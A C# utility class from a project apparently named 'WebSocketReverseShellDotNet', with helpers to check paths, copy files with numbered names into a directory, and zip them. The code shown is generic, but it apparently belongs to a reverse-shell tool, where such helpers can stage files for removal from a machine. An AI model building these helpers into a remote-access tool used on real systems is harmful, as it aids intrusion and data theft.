using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.model;
using WebSocketReverseShellDotNet.service.commands;

namespace WebSocketReverseShellDotNet.utils
{
    internal static class OSUtil
    {


        public static string GetSystemTempDir()
        {
            return Path.GetTempPath();
        }



        public static bool FileExists(string path)
        {
            // Expand environment variables in the path
            string expandedPath = Environment.ExpandEnvironmentVariables(path);

            // Check if the expanded path represents an existing file
            return File.Exists(expandedPath);
        }

        public static bool DirectoryExists(string path)
        {
            // Expand environment variables in the path
            string expandedPath = Environment.ExpandEnvironmentVariables(path);

            // Check if the expanded path represents an existing file
            return Directory.Exists(expandedPath);
        }




        public static string CopyFileWithNumberPreAppended(string sourcePath, string destinationDirectory, int fileNumber)
        {

 
            if (FileExists(sourcePath))
            {
                string fileName = Path.GetFileName(sourcePath);
                string newFileName = $"{fileNumber}_{fileName}";
                string destinationPath = Path.Combine(destinationDirectory, newFileName);
                try
                {
                    if (File.Exists(destinationPath) )
                    {
                        File.Delete(destinationPath);

                    }


                    // Move the file to the new directory
                    File.Copy(Environment.ExpandEnvironmentVariables(sourcePath), destinationPath);

                    return destinationPath;
                }
                catch (Exception ex)
                {
                    Console.WriteLine(($"Error moving file: {ex.Message}"));
                    return "";
                }
            }
            else
            {
                Console.WriteLine(($"The file '{sourcePath}' does not exist."));
                return  "";
            }
        }

        public static FileInfo? ZipFiles(List<string> files, string outputDirectory, string zipFileName)
        {
            try
            {
                // Ensure the output directory exists
                if (!Directory.Exists(outputDirectory))
                {
                    Directory.CreateDirectory(outputDirectory);
                }

                // Combine the output directory and zip file name to get the full path
                string outputPath = Path.Combine(outputDirectory, zipFileName);

                // Check if the file already exists
                if (File.Exists(outputPath))
                {
                    File.Delete(outputPath); // Delete the existing file
                }

                // Create a new zip file
                using (ZipArchive zipArchive = ZipFile.Open(outputPath, ZipArchiveMode.Update))
                {
                    foreach (string filePath in files)
                    {
                        // Ensure the file exists before adding it to the zip archive
                        if (File.Exists(filePath))
                        {
                            // Create an entry in the zip archive for the file
                            zipArchive.CreateEntryFromFile(filePath, Path.GetFileName(filePath));
                        }
                        else
                        {
                            /*Console.WriteLine($"File not found: {filePath}");*/
                        }
                        if (zipArchive.Entries.Count == 0) return null;
                    }
                }


                // Return FileInfo for the created zip file
                return new FileInfo(outputPath);
            }
            catch (Exception ex)
            {
                // Handle any exceptions that may occur during zipping
                Console.WriteLine($"Error zipping files: {ex.Message}");
                return null;
            }
        }



    }
}
